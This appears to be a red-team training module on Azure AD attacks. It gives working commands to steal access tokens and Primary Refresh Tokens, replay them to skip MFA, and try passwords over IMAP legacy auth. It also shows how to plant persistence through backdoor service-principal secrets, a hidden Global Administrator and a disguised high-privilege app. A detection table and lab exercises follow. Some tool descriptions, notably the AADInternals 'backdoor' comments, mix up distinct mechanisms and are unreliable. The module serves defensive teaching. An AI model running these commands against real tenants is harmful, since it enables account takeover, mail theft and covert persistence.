---
title: "Azure Attack Lab — Token Abuse, Conditional Access Bypass, Persistence"
tags: [red-team, cloud, Azure, AzureAD, token-abuse, PRT, conditional-access,
  AADInternals, pass-the-token, persistence, ATT&CK, T1550.001, T1528, T1098.001]
module: 08-RedTeam-03
day: 526
related_topics:
  - Azure Red Teaming (Day 525)
  - Kubernetes Security (Day 527)
  - Golden Ticket and Domain Dominance (Day 499)
---

# Day 526 — Azure Attack Lab

> "The Azure equivalent of a Golden Ticket is a PRT. If you have a user's
> Primary Refresh Token, you have a 14-day credential that can generate access
> tokens for any application the user has access to — including bypassing
> multi-factor authentication because the PRT already contains the MFA claim.
> The on-prem attacker steals krbtgt and forges tickets. The cloud attacker
> steals the PRT and generates tokens. Same logic, different layer."
>
> — Ghost

---

## Goals

Steal and abuse Azure AD access tokens and Primary Refresh Tokens (PRTs).
Bypass Conditional Access policies using token manipulation.
Execute Azure AD persistence via Service Principal credential addition and
role assignment.
Use AADInternals for targeted Azure AD attacks.
Generate the correct detection signals and map them to Microsoft Sentinel rules.

**Prerequisites:** Day 525 (Azure enumeration), Day 499 (Golden Ticket — for PRT
analogy), OAuth 2.0 token concepts.
**Time budget:** 5 hours.

---

## Part 1 — Token Theft: Access Token vs PRT

### Access Token Theft

```
Access tokens are JWTs (JSON Web Tokens) stored in browser memory, process
memory, or file system token caches. They are valid for ~1 hour.

Storage locations on Windows (Azure AD-joined or hybrid-joined devices):
  → Browser memory (Chrome, Edge): in-process, requires browser injection
  → MSAL token cache: %APPDATA%\Microsoft\<application>\MSAL.cache
  → WAM (Web Authentication Manager): in LSASS-adjacent storage
  → .json token files: ~/.azure/accessTokens.json (Azure CLI),
    ~\.roadtools_auth (Roadtools)

Stealing access tokens from az CLI cache:
  cat ~/.azure/accessTokens.json
  cat ~/.azure/msal_token_cache.bin | python3 -c "
  import json,sys,base64
  data=json.load(sys.stdin)
  for key,val in data.get('AccessToken',{}).items():
      print(val.get('access_token','')[:50],'...')"

Using a stolen access token:
  # Set the token directly in the Authorization header:
  ACCESS_TOKEN=eyJ0eXAiOiJKV1Q...
  curl -H "Authorization: Bearer $ACCESS_TOKEN" \
      "https://graph.microsoft.com/v1.0/users"

  # Or configure Roadtools to use it:
  echo '{"access_token":"eyJ0eXAiOiJKV1Q...","refresh_token":""}' > .roadtools_auth
  roadrecon gather
```

### Primary Refresh Token (PRT) — The Cloud Golden Ticket

```
PRT: a special token issued to Azure AD-joined or hybrid-joined Windows devices.
  → Stored in LSASS on the device (in the CloudAP plugin)
  → Valid for 14 days (renewable)
  → Contains the MFA claim: tokens derived from a PRT satisfy MFA requirements
    even if MFA was not performed during this session
  → Signed with a device session key (RSA key stored in TPM or LSASS)

What a PRT can do:
  → Generate access tokens for ANY Azure AD-connected application
  → Bypass MFA Conditional Access policies (MFA claim is already in the PRT)
  → Access: Exchange/Outlook, SharePoint, Teams, Azure portal, Graph API,
    any SSO-integrated SaaS application

PRT theft requires:
  → SYSTEM or LSASS access on an Azure AD-joined Windows device
  → The PRT cookie is extracted from LSASS (CloudAP plugin)
  → It can then be used from any machine to generate tokens
```

### Extracting a PRT with ROADtoken (Mimikatz-equivalent for PRTs)

```powershell
# ROADtoken (BofRoast / ShiftLeft Security)
# Runs as SYSTEM on an Azure AD-joined device
# Extracts the PRT cookie from LSASS CloudAP plugin

# Via a beacon (SYSTEM shell on an Azure AD-joined endpoint):
[beacon] > execute-assembly /path/to/ROADtoken.exe

# Output:
# [*] Nonce: <nonce_value>
# [*] PRT cookie:
# x-ms-RefreshTokenCredential: <base64_encoded_prt_cookie>

# Save the PRT cookie:
PRT_COOKIE="x-ms-RefreshTokenCredential: eyJ0eXAiOiJKV1Q..."
```

### Using the PRT Cookie to Generate Tokens

```bash
# Use Roadtx to exchange the PRT cookie for tokens:
roadtx prtauth \
    --prt-cookie "$PRT_COOKIE" \
    --client-id d3590ed6-52b3-4102-aeff-aad2292ab01c \
    --tenant TARGET_TENANT_ID \
    --resource https://graph.microsoft.com/

# → roadtx writes access_token + refresh_token to .roadtools_auth
# The access token contains the MFA claim (amr: ["mfa"]) from the PRT
# → Conditional Access policies requiring MFA are satisfied

# Access the user's email (Exchange):
roadtx prtauth \
    --prt-cookie "$PRT_COOKIE" \
    --resource https://outlook.office365.com/

curl -H "Authorization: Bearer $ACCESS_TOKEN" \
    "https://outlook.office365.com/api/v2.0/me/messages?\$top=10&\$orderby=ReceivedDateTime desc"
# → Last 10 emails in the victim's inbox
```

---

## Part 2 — Conditional Access Bypass

### How Conditional Access Works

```
Conditional Access policies evaluate every sign-in and apply conditions:
  → Who: which users/groups are in scope
  → What: which applications are accessed
  → Where: sign-in country/region, named location, compliant device status
  → How: MFA required, device compliance required, token binding required

CA bypass techniques:

Technique 1: Legacy Authentication Bypass
  → Legacy auth protocols (SMTP, IMAP, POP, MAPI) do not support MFA
  → CA policies that do not explicitly block legacy auth can be bypassed
  → Test: spray credentials via IMAP (port 993) or SMTP-Auth against Exchange
  → Detection: Sign-In logs with ClientAppUsed = "IMAP4" or "POP3"

Technique 2: PRT with MFA claim (described above)
  → PRT already contains MFA claim → CA MFA requirement satisfied automatically
  → No user interaction; tokens work from any IP

Technique 3: Token replay after theft
  → Steal a valid access token from a device/browser on a trusted IP/device
  → Replay from a different IP
  → CA "Compliant Device" policy may block this if token is device-bound
  → But most CA policies do not enforce token binding (device-bound tokens
    require Microsoft Entra token protection — not widely deployed)

Technique 4: Exploit Conditional Access policy gaps
  → Many CA policies exempt: break-glass accounts, service accounts, legacy apps
  → Identify excluded users/groups in roadrecon output and target them first
```

### Abusing Legacy Authentication

```bash
# Test for legacy auth (Exchange IMAP spray):
# Install imaplib or use curl with IMAP:
python3 << 'EOF'
import imaplib
server = imaplib.IMAP4_SSL('outlook.office365.com', 993)
try:
    server.login('jsmith@corp.onmicrosoft.com', 'Password123')
    print('[+] SUCCESS: Legacy auth works, MFA bypassed')
except imaplib.IMAP4.error as e:
    print(f'[-] Failed: {e}')
server.logout()
EOF

# If successful: fetch emails via IMAP (bypassed CA + MFA entirely)
# This attack vector is closed only by: CA policy explicitly blocking legacy auth
# Check: Conditional Access → Named location + legacy auth block policy
```

---

## Part 3 — Azure AD Persistence

### Add Credentials to a Service Principal

```bash
# If you have Application.ReadWrite.All or Directory.ReadWrite.All:
# Add a backdoor client secret to an existing high-privilege SP

# Find the Application Object ID of a high-privilege app:
az ad app list --query "[?displayName=='HighPrivilegeApp'].{name:displayName,id:appId,objId:id}"

APP_OBJECT_ID=<object ID from above>

# Add a new password credential:
az ad app credential reset \
    --id $APP_OBJECT_ID \
    --append \
    --display-name "AutoRenew2025" \
    --years 2
# → New client secret returned (only visible at creation time)
# → Use this to authenticate as the SP from any machine, indefinitely

# Detection: Azure AD audit log "Add application credentials"
# Most orgs do not alert on this event — it is a known persistence gap
```

### Grant Privileged Azure AD Role to a Backdoor Account

```bash
# If you are Global Administrator (or Privileged Role Administrator):
# Add a low-profile user to Global Administrator role silently

# Find the Global Administrator role template ID:
GA_ROLE_ID=$(az rest --method GET \
    --uri "https://graph.microsoft.com/v1.0/directoryRoles" \
    --query "value[?displayName=='Global Administrator'].id" \
    --output tsv)

# Add backdoor user to Global Administrator:
az rest --method POST \
    --uri "https://graph.microsoft.com/v1.0/directoryRoles/$GA_ROLE_ID/members/\$ref" \
    --body "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/users/BACKDOOR_USER_ID\"}"

# Detection: Azure AD audit log "Add member to role"
# alert_on: role = Global Administrator AND actor is not a known privileged account

# More stealthy: add to a less-monitored but still high-priv role:
# Application Administrator: can read/write all app registrations
# Privileged Authentication Administrator: can reset any user's password/MFA
# These roles appear less alarming than "Global Administrator" in dashboards
```

### Register a New Application (Invisible Backdoor)

```bash
# Register a new application with high permissions — does not show up as
# a "new user" in audit queries

az ad app create \
    --display-name "Microsoft Graph Helper" \
    --sign-in-audience AzureADMyOrg

APP_ID=$(az ad app list --display-name "Microsoft Graph Helper" --query '[0].appId' -o tsv)

# Create a service principal for the new app:
az ad sp create --id $APP_ID

# Grant the app Directory.ReadWrite.All (admin consent required):
az ad app permission add \
    --id $APP_ID \
    --api 00000003-0000-0000-c000-000000000000 \
    --api-permissions 19dbc75e-c2e2-444c-a770-ec69d8559fc7=Role  # Directory.ReadWrite.All

az ad app permission admin-consent --id $APP_ID

# Add a client secret:
az ad app credential reset --id $APP_ID --append
# → Now you have an SP with Directory.ReadWrite.All, usable from any machine
# → It looks like an internal application, not a new admin user
```

---

## Part 4 — AADInternals

```powershell
# AADInternals (Dr. Nestori Syynimaa / @DrAzureAD)
# The most comprehensive Azure AD attack toolkit

Install-Module AADInternals -Scope CurrentUser

# Authenticate (device code):
$creds = Get-AADIntAccessTokenForMSGraph -SaveToCache

# Enumerate tenant:
Get-AADIntTenantDetails
Get-AADIntUsers         # all users
Get-AADIntGroups        # all groups
Get-AADIntServicePrincipals

# Get a list of all OAuth2 permissions (high-value SP permissions):
Get-AADIntServicePrincipals | Where-Object {$_.appDisplayName -ne $null} |
    ForEach-Object {
        $sp = $_
        Get-AADIntServicePrincipalAppRoles -ServicePrincipalId $sp.id |
            Where-Object {$_.value -match "Write|Admin|All"} |
            Select-Object @{N='SP';E={$sp.displayName}}, value
    }

# Extract and abuse a PRT cookie from the local machine:
# (Requires running as the user whose PRT you want to extract — not SYSTEM)
$prtToken = Get-AADIntUserPRTToken
# Returns: the PRT cookie for the current user's device session

# Convert PRT to an access token for Microsoft Graph:
$graphToken = Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken

# Read user's emails via Exchange:
$exoToken = Get-AADIntAccessTokenForEXO -PRTToken $prtToken
Get-AADIntEmails -AccessToken $exoToken -Top 10

# GlobalAdmin backdoor: add a backdoor to the tenant (if GA):
# This modifies federation settings to accept tokens signed by ANY issuer:
Set-AADIntPassThroughAuthentication -Enable $true
# → After this, ANY password authenticates for ANY user in the tenant
# (ImmutableID-based authentication backdoor)
# → CRITICAL: only use in lab environments — this destroys all authentication
# → Detection: change to PassThroughAuthentication domain federation settings
```

---

## Part 5 — Detection Summary

| Attack | Audit Log Source | Event/Operation | Alert condition |
|---|---|---|---|
| Access token theft | Sign-In Logs | Sign-in from new IP/device | IP not in user's usual ISP; new device |
| PRT theft + replay | Sign-In Logs | Sign-in, UserAuthenticationMethod=PRT | PRT sign-in from non-Windows device or unusual IP |
| Legacy auth bypass | Sign-In Logs | ClientAppUsed = IMAP4/POP3/SMTP | Any legacy auth that is not explicitly expected |
| SP credential add | Azure AD Audit | Add application credentials | SP credentials added by non-CI/CD account |
| Role assignment | Azure AD Audit | Add member to role | Any Global/Privileged Admin role change |
| New app registration | Azure AD Audit | Add application | App with Directory.ReadWrite.All admin consent |
| Federation backdoor | Azure AD Audit | Set domain authentication | Any change to federated domain settings |

---

## Key Takeaways

1. The PRT is the Azure AD equivalent of the Kerberos TGT. A stolen PRT bypasses
   MFA, generates tokens for any application, and is valid for 14 days. Protecting
   devices that hold PRTs is equivalent to protecting LSASS in on-prem AD.
   Enable Microsoft Defender for Endpoint with attack surface reduction rules to
   protect the CloudAP LSASS plugin.
2. Conditional Access "MFA required" policies are bypassed by PRT theft — the PRT
   already carries the MFA claim. The only control that protects against this is
   device compliance policy combined with token protection (binding the token to a
   specific device). Deploy both; MFA alone is not sufficient.
3. Service Principal credential additions are the most durable Azure AD persistence
   mechanism. Unlike user account additions (which appear in "Add member to role"
   alerts), a new credential on an existing SP looks like routine certificate
   rotation. Most SIEM rules do not alert on this by default.
4. Legacy authentication bypass is the first thing to check in any Azure
   engagement. If Exchange is exposed on port 993 (IMAP) and the CA policy does
   not explicitly block legacy auth, MFA is irrelevant. Lock this down before
   anything else — it is a 2019-era gap that still exists in most tenants.
5. AADInternals's federation backdoor (`Set-AADIntPassThroughAuthentication`) is
   the most destructive Azure AD persistence technique available. It makes every
   user account accessible with any password. It is also the most detectable —
   any change to domain federation settings in Azure AD audit logs is a critical
   alert. Never deploy this outside a lab.

---

## Exercises

1. In a lab Azure AD tenant: steal your own access token from the az CLI cache
   (`~/.azure/accessTokens.json`). Use it to call the Microsoft Graph API from a
   Python script. Verify it works. Then let it expire (or delete the cache and
   re-authenticate with `az login`) and observe the 401 Unauthorized response.
2. Configure a Conditional Access policy in the lab tenant: "Require MFA for all
   users accessing Microsoft Graph." Then try to authenticate with a Service
   Principal client secret (not a user account). Does MFA apply to Service
   Principals? Why or why not?
3. Use AADInternals `Get-AADIntServicePrincipals` in the lab tenant. Identify
   any SP with `Directory.Read.All` or higher permissions. Write a KQL Sentinel
   query that would alert if a new SP with these permissions had admin consent
   granted.
4. Add a backdoor client secret to a lab Service Principal (az ad app credential
   reset --append). Verify you can authenticate as that SP from a different machine
   using the new secret. Then check the Azure AD audit logs — what event was
   generated? What information is visible to a defender?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q526.1, Q526.2 …).

---

## Navigation

← Previous: [Day 525 — Azure Red Teaming](DAY-0525-Azure-Red-Teaming.md)
→ Next: [Day 527 — Kubernetes Security](DAY-0527-Kubernetes-Security.md)
